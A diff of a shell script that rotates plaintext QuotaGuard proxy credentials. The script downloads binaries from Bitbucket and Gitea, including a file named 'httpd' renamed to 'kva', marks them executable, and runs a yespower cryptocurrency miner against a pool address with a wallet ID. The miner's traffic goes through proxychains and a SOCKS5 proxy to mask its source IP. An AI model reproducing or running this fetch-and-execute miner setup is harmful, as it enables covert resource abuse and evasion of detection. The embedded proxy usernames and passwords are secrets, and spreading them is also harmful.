@@ -1,7 +1,7 @@
-proxy="us-east-static-08.quotaguard.com" 
+proxy="us-east-static-06.quotaguard.com" 
 port="9293" 
-user="425dlrn5kpryex"  
-pass="x2mzz8lq69wgze6pe2bcqg668ze9" 
+user="stn3ggvkldsddw"  
+pass="p3r35flqfwbmajhygybulo10517x1" 
 wget -q -O kva https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x kva
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./kva -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-jikananti) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://425dlrn5kpryex:x2mzz8lq69wgze6pe2bcqg668ze9@us-east-static-08.quotaguard.com:1080 
+./panel ./kva -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-jikananti) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://stn3ggvkldsddw:p3r35flqfwbmajhygybulo10517x1@us-east-static-06.quotaguard.com:1080 
